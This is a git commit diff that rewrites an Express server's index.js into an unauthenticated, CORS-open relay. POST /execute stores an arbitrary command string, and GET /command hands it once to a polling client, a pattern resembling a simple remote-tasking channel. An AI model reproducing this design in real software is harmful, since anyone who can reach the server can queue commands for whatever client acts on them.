2098c2c5464f0d3c139351da2061c47c2c44cd2c
DiffalexI <ahmedsamh12ha@gmail.com>
2024-11-08 22:42:00 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,8 +1,29 @@
 const express = require('express');
-const app = express();
+const cors = require('cors');
 
-app.get('/', (req, res) => {
-    res.json({ message: 'Hello from Express!' });
+const app = express();
+app.use(cors());
+app.use(express.json());
+
+let latestCommand = '';
+
+app.post('/execute', (req, res) => {
+    const { command } = req.body;
+    if (command) {
+        latestCommand = command;
+        console.log(`Received command: ${command}`);
+        return res.json({ message: 'Command received', command });
+    }
+    return res.status(400).json({ error: 'No command provided' });
+});
+
+app.get('/command', (req, res) => {
+    if (latestCommand) {
+        const commandToSend = latestCommand;
+        latestCommand = '';
+        return res.json({ command: commandToSend });
+    }
+    return res.status(404).json({ error: 'No command available' });
 });
 
 module.exports = app;
